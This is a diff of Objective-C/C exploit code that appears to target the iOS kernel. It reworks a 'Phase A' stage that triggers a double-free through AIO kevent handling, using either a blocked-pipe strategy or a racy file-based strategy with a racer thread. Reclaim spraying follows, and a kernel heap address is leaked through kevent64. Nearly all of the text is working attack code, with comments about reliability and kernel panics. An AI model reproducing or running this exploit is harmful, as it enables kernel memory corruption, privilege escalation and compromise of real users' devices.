@@ -5674,163 +5674,157 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     static struct aiocb rcbs[AIO_NRECLAIM];
     static char rbufs[AIO_NRECLAIM][8192];   // exact fit for 0x2000 nbytes
 
-    // ---- Phase A: Pipe-blocked race elimination ----
-    // Original approach raced aio_return reclaim against lio_listio's
-    // aio_register_kevent, with ~30% failure → kernel panic (FAR=0x58).
+    // ---- Phase A: Double-free via AIO kevent UAF ----
+    // Two strategies:
+    //   PIPE: Worker blocks on empty pipe → kevent registers safely → 100% reliable.
+    //         But AIO on pipes may not be supported on all iOS versions.
+    //   FILE: Race aio_return+reclaim against lio_listio's aio_register_kevent.
+    //         ~70% success, ~30% kernel panic (FAR=0x58) when reclaim misses the slot.
     //
-    // NEW approach: AIO worker blocks on EMPTY pipe read. aio_register_kevent
-    // runs while worker is blocked (entry valid, no race). Then we write to
-    // pipe → worker wakes → KNOTE fires → entry freed & reclaimed on MAIN
-    // thread (no racer thread) → kevent64 → double-free.
-    //
-    // This eliminates the race window entirely. No racer thread needed.
+    // Pre-check pipe AIO support. Use pipe if available, otherwise file.
+
+    BOOL pipeAioWorks = NO;
+    {
+        int testPipe[2];
+        if (pipe(testPipe) == 0) {
+            struct aiocb testCb;
+            char testBuf[64];
+            memset(&testCb, 0, sizeof(testCb));
+            testCb.aio_fildes = testPipe[0];
+            testCb.aio_buf = testBuf;
+            testCb.aio_nbytes = sizeof(testBuf);
+            testCb.aio_lio_opcode = LIO_READ;
+            testCb.aio_sigevent.sigev_notify = SIGEV_NONE;
+            struct aiocb *testPtr = &testCb;
+            struct sigevent testSig = {};
+            testSig.sigev_notify = SIGEV_NONE;
+            char testData[64];
+            memset(testData, 'T', sizeof(testData));
+            write(testPipe[1], testData, sizeof(testData));
+            if (lio_listio(LIO_NOWAIT, &testPtr, 1, &testSig) == 0) {
+                int wl = 0;
+                while (aio_error(&testCb) == EINPROGRESS && ++wl <= 50) usleep(100);
+                if (wl <= 50) {
+                    pipeAioWorks = YES;
+                    aio_return(&testCb);
+                }
+            }
+            close(testPipe[0]); close(testPipe[1]);
+        }
+    }
+    [self appendLog:pipeAioWorks ? @"  Pipe AIO: SUPPORTED — using race-free pipe strategy"
+                                : @"  Pipe AIO: NOT supported — using file-based race strategy"];
 
     for (int attempt = 0; attempt < 5; attempt++) {
-        [self appendLog:[NSString stringWithFormat:@"Phase A attempt %d (pipe-blocked)", attempt]];
+        [self appendLog:[NSString stringWithFormat:@"Phase A attempt %d (%@)", attempt,
+                         pipeAioWorks ? @"pipe" : @"file"]];
 
-        // Create fresh pipe for each attempt — worker blocks on empty read end
-        int pipefd[2];
-        if (pipe(pipefd) < 0) {
-            [self appendLog:@"  pipe() failed"];
-            continue;
-        }
-        // Set write end non-blocking so we don't hang if something goes wrong
-        int wflags = fcntl(pipefd[1], F_GETFL, 0);
-        fcntl(pipefd[1], F_SETFL, wflags | O_NONBLOCK);
+        if (pipeAioWorks) {
+            // ============================================================
+            // PIPE STRATEGY: Worker blocks on empty pipe, kevent registers
+            // while worker is blocked. No race. ~100% reliable.
+            // ============================================================
 
-        int kq = kqueue();
-        if (kq < 0) {
-            [self appendLog:@"  kqueue failed"];
-            close(pipefd[0]); close(pipefd[1]);
-            continue;
-        }
+            int pipefd[2];
+            if (pipe(pipefd) < 0) { [self appendLog:@"  pipe() failed"]; continue; }
+            fcntl(pipefd[1], F_SETFL, fcntl(pipefd[1], F_GETFL, 0) | O_NONBLOCK);
 
-        // Trigger: AIO read from pipe's READ end (EMPTY → worker blocks)
-        static struct aiocb tcb;
-        static char tbuf[4096];
-        memset(&tcb, 0, sizeof(tcb));
-        tcb.aio_fildes = pipefd[0];   // read end of EMPTY pipe → worker blocks
-        tcb.aio_buf = tbuf;
-        tcb.aio_nbytes = sizeof(tbuf);
-        tcb.aio_lio_opcode = LIO_READ;
-        tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
-        tcb.aio_sigevent.sigev_signo = kq;
-        tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
+            int kq = kqueue();
+            if (kq < 0) { close(pipefd[0]); close(pipefd[1]); continue; }
 
-        // Submit — lio_listio enqueues work, worker blocks on empty pipe,
-        // THEN aio_register_kevent runs (entry is valid, no race!)
-        struct aiocb *ptr = &tcb;
-        struct sigevent sig = {};
-        sig.sigev_notify = SIGEV_NONE;
-        int lr = lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
-        if (lr != 0) {
-            [self appendLog:[NSString stringWithFormat:@"  lio_listio failed: %d (errno=%d) — pipe AIO may not be supported", lr, errno]];
-            close(kq); close(pipefd[0]); close(pipefd[1]);
-            // Fall back: the fd-based approach below will work
-            goto pipe_fallback;
-        }
+            static struct aiocb tcb;
+            static char tbuf[4096];
+            memset(&tcb, 0, sizeof(tcb));
+            tcb.aio_fildes = pipefd[0];    // empty pipe → worker blocks
+            tcb.aio_buf = tbuf;
+            tcb.aio_nbytes = sizeof(tbuf);
+            tcb.aio_lio_opcode = LIO_READ;
+            tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+            tcb.aio_sigevent.sigev_signo = kq;
+            tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
 
-        // At this point: worker kernel thread is BLOCKED on empty pipe.
-        // aio_register_kevent has registered the knote on a VALID entry.
-        // No race — the entry cannot be freed while worker is blocked.
+            struct aiocb *ptr = &tcb;
+            struct sigevent sig = {};
+            sig.sigev_notify = SIGEV_NONE;
+            if (lio_listio(LIO_NOWAIT, &ptr, 1, &sig) != 0) {
+                [self appendLog:[NSString stringWithFormat:@"  lio_listio failed: %d", errno]];
+                close(kq); close(pipefd[0]); close(pipefd[1]);
+                pipeAioWorks = NO;  // disable pipe for remaining attempts
+                continue;
+            }
 
-        // Write data to pipe → worker wakes up, reads, completes I/O, KNOTE fires
-        char pipeData[4096];
-        memset(pipeData, 'P', sizeof(pipeData));
-        ssize_t wbytes = write(pipefd[1], pipeData, sizeof(pipeData));
-        if (wbytes < 0) {
-            [self appendLog:@"  pipe write failed — worker may still be blocked"];
-            close(kq); close(pipefd[0]); close(pipefd[1]);
-            continue;
-        }
-        [self appendLog:[NSString stringWithFormat:@"  wrote %zd bytes to pipe → worker unblocked", wbytes]];
+            // Worker is BLOCKED on empty pipe. aio_register_kevent has run.
+            // Entry is VALID. Write to pipe → worker wakes → KNOTE fires.
+            char pipeData[4096];
+            memset(pipeData, 'P', sizeof(pipeData));
+            write(pipefd[1], pipeData, sizeof(pipeData));
 
-        // Wait for AIO to complete (KNOTE has fired by now, kevent is active)
-        int waitLoops = 0;
-        while (aio_error(&tcb) == EINPROGRESS) {
-            if (++waitLoops > 1000) {
-                [self appendLog:@"  timeout waiting for pipe AIO completion"];
+            int wl = 0;
+            while (aio_error(&tcb) == EINPROGRESS && ++wl <= 50) usleep(100);
+            if (wl > 50) {
+                [self appendLog:@"  pipe AIO timeout — disabling pipe"];
+                close(kq); close(pipefd[0]); close(pipefd[1]);
+                pipeAioWorks = NO;
+                continue;
+            }
+
+            // KNOTE has fired. Free trigger + reclaim on same thread (no race).
+            aio_return(&tcb);
+
+            int reclaimOk = 0;
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
+                memset(&rcbs[i], 0, sizeof(rcbs[i]));
+                rcbs[i].aio_fildes = fd;
+                rcbs[i].aio_buf = rbufs[i];
+                rcbs[i].aio_nbytes = 0x2000;
+                rcbs[i].aio_offset = 0;
+                rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+                if (aio_read(&rcbs[i]) == 0) reclaimOk++;
+            }
+
+            if (reclaimOk < AIO_NRECLAIM) {
+                [self appendLog:[NSString stringWithFormat:@"  reclaim %d/%d — retrying", reclaimOk, AIO_NRECLAIM]];
+                close(pipefd[0]); close(pipefd[1]);
+                continue;
+            }
+
+            for (int i = 0; i < AIO_NRECLAIM; i++)
+                while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+            struct kevent64_s kev = {};
+            struct timespec ts = {10, 0};
+            int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+
+            if (nev > 0) {
+                [self appendLog:@"*** PHASE A (pipe): DOUBLE-FREE ACHIEVED ***"];
+                [self appendLog:[NSString stringWithFormat:@"  ident=0x%llx ext[1]=0x%llx", kev.ident, kev.ext[1]]];
+                if (kev.ext[1] == 0x2000)
+                    [self appendLog:@"  >> ext[1] CONTROLLABLE via reclaim aio_nbytes <<"];
+                self.leakedKernelAddr = kev.ident;
+                for (int i = 0; i < AIO_NRECLAIM; i++) {
+                    if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
+                }
+                close(kq); close(pipefd[0]); close(pipefd[1]);
                 break;
-            }
-            usleep(100);
-        }
-        if (waitLoops > 1000) {
-            close(kq); close(pipefd[0]); close(pipefd[1]);
-            continue;
-        }
-        [self appendLog:[NSString stringWithFormat:@"  pipe AIO completed after %d loops", waitLoops]];
-
-        // KNOTE has already fired → knote is in kqueue's active list.
-        // Now free trigger entry and IMMEDIATELY reclaim on main thread.
-        // No racer thread needed — free+reclaim are back-to-back on same CPU.
-        aio_return(&tcb);  // frees aio_workq_entry → CPU magazine
-
-        // Reclaim entries using regular file fd (data is cached, fast read)
-        int reclaimOk = 0;
-        for (int i = 0; i < AIO_NRECLAIM; i++) {
-            memset(&rcbs[i], 0, sizeof(rcbs[i]));
-            rcbs[i].aio_fildes = fd;   // regular file — cached data, instant I/O
-            rcbs[i].aio_buf = rbufs[i];
-            rcbs[i].aio_nbytes = 0x2000;  // 8192 — distinguishable from trigger's 0x1000
-            rcbs[i].aio_offset = 0;
-            rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-            if (aio_read(&rcbs[i]) == 0) reclaimOk++;
-        }
-        [self appendLog:[NSString stringWithFormat:@"  reclaim: %d/%d aio_read submitted", reclaimOk, AIO_NRECLAIM]];
-
-        if (reclaimOk < AIO_NRECLAIM) {
-            [self appendLog:@"  reclaim incomplete — leaking kq and retrying"];
-            close(pipefd[0]); close(pipefd[1]);
-            continue;
-        }
-
-        // Wait for reclaim entries to complete
-        for (int i = 0; i < AIO_NRECLAIM; i++)
-            while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
-
-        // Drain kqueue → filt_aioprocess on reclaimed entry → double-free
-        struct kevent64_s kev = {};
-        struct timespec ts = {10, 0};
-        int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
-
-        if (nev > 0) {
-            [self appendLog:@"*** PHASE A: DOUBLE-FREE ACHIEVED ***"];
-            [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx (kernel heap addr)", kev.ident]];
-            [self appendLog:[NSString stringWithFormat:@"  data   = 0x%llx", (uint64_t)kev.data]];
-            [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx (errorval)", kev.ext[0]]];
-            [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (returnval)", kev.ext[1]]];
-            if (kev.ext[1] == 0x2000) {
-                [self appendLog:@"  >> CONFIRMED: ext[1] from reclaim entry (nbytes=0x2000) <<"];
-                [self appendLog:@"  >> ext[1] is CONTROLLABLE via aio_nbytes <<"];
-            } else if (kev.ext[1] == 0x1000) {
-                [self appendLog:@"  >> ext[1]=0x1000 — from trigger entry (not reclaim) <<"];
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  >> ext[1]=0x%llx, expected 0x1000 or 0x2000 <<", kev.ext[1]]];
+                [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
+                for (int i = 0; i < AIO_NRECLAIM; i++) {
+                    if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
+                }
+                close(kq); close(pipefd[0]); close(pipefd[1]);
             }
 
-            self.leakedKernelAddr = kev.ident;
-            [self appendLog:[NSString stringWithFormat:@"  leaked kernel heap addr: 0x%llx", self.leakedKernelAddr]];
-
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
-                if (aio_error(&rcbs[i]) != EINVAL)
-                    aio_return(&rcbs[i]);
-            }
-            close(kq); close(pipefd[0]); close(pipefd[1]);
-            break;  // SUCCESS — exit attempt loop
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d, errno=%d)", nev, errno]];
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
-                if (aio_error(&rcbs[i]) != EINVAL)
-                    aio_return(&rcbs[i]);
-            }
-            close(kq); close(pipefd[0]); close(pipefd[1]);
-        }
-        continue;  // only reached on timeout/failure
+            // ============================================================
+            // FILE STRATEGY: Racer thread frees trigger between lio_listio's
+            // enqueue and kevent register, then reclaims same slot via LIFO.
+            // ============================================================
 
-    pipe_fallback:
-        [self appendLog:@"  >> Pipe AIO not supported, trying file-based race <<"];
-        {
-            // Setup tcb for file-based approach (kq already exists)
+            int kq = kqueue();
+            if (kq < 0) { [self appendLog:@"kqueue failed"]; continue; }
+
+            static struct aiocb tcb;
+            static char tbuf[4096];
             memset(&tcb, 0, sizeof(tcb));
             tcb.aio_fildes = fd;
             tcb.aio_buf = tbuf;
@@ -5859,57 +5853,54 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             pthread_create(&thr, NULL, aio_free_and_reclaim_racer, &rs);
             atomic_store_explicit(&rs.start, true, memory_order_release);
 
-            struct aiocb *ptr2 = &tcb;
-            struct sigevent sig2 = {};
-            sig2.sigev_notify = SIGEV_NONE;
-            lio_listio(LIO_NOWAIT, &ptr2, 1, &sig2);
+            struct aiocb *ptr = &tcb;
+            struct sigevent sig = {};
+            sig.sigev_notify = SIGEV_NONE;
+            lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
 
             usleep(500);
             atomic_store_explicit(&rs.stop, true, memory_order_release);
             pthread_join(thr, NULL);
 
-            int freed2 = atomic_load(&rs.freed);
-            bool reclaimed2 = atomic_load(&rs.reclaim_done);
+            int freed = atomic_load(&rs.freed);
+            bool reclaimed = atomic_load(&rs.reclaim_done);
 
-            if (freed2 == 0) {
-                close(kq);  // safe — entry still valid when kq closed
+            if (freed == 0) {
+                close(kq);  // BEFORE aio_return — entry still valid
                 while (aio_error(&tcb) == EINPROGRESS) usleep(500);
                 aio_return(&tcb);
-                close(pipefd[0]); close(pipefd[1]);
-                [self appendLog:@"  fallback: race lost"];
+                [self appendLog:@"  race lost, retrying"];
                 continue;
             }
-            if (!reclaimed2) {
-                close(pipefd[0]); close(pipefd[1]);
-                [self appendLog:[NSString stringWithFormat:@"  fallback: freed but no reclaim, leaking kq=%d", kq]];
+            if (!reclaimed) {
+                [self appendLog:[NSString stringWithFormat:@"  freed but no reclaim, leaking kq=%d", kq]];
                 continue;
             }
 
             for (int i = 0; i < AIO_NRECLAIM; i++)
                 while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-            struct kevent64_s kev2 = {};
-            struct timespec ts2 = {10, 0};
-            int nev2 = kevent64(kq, NULL, 0, &kev2, 1, 0, &ts2);
+            struct kevent64_s kev = {};
+            struct timespec ts = {10, 0};
+            int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
 
-            if (nev2 > 0) {
-                [self appendLog:@"*** PHASE A (file fallback): DOUBLE-FREE ACHIEVED ***"];
-                [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx", kev2.ident]];
-                [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx", kev2.ext[1]]];
-                self.leakedKernelAddr = kev2.ident;
+            if (nev > 0) {
+                [self appendLog:@"*** PHASE A (file): DOUBLE-FREE ACHIEVED ***"];
+                [self appendLog:[NSString stringWithFormat:@"  ident=0x%llx ext[1]=0x%llx", kev.ident, kev.ext[1]]];
+                if (kev.ext[1] == 0x2000)
+                    [self appendLog:@"  >> ext[1] CONTROLLABLE via reclaim aio_nbytes <<"];
+                self.leakedKernelAddr = kev.ident;
                 for (int i = 0; i < AIO_NRECLAIM; i++) {
-                    if (aio_error(&rcbs[i]) != EINVAL)
-                        aio_return(&rcbs[i]);
+                    if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
                 }
-                close(kq); close(pipefd[0]); close(pipefd[1]);
+                close(kq);
                 break;
             } else {
-                [self appendLog:@"  fallback: kevent64 timeout"];
+                [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
                 for (int i = 0; i < AIO_NRECLAIM; i++) {
-                    if (aio_error(&rcbs[i]) != EINVAL)
-                        aio_return(&rcbs[i]);
+                    if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
                 }
-                close(kq); close(pipefd[0]); close(pipefd[1]);
+                close(kq);
             }
         }
     }
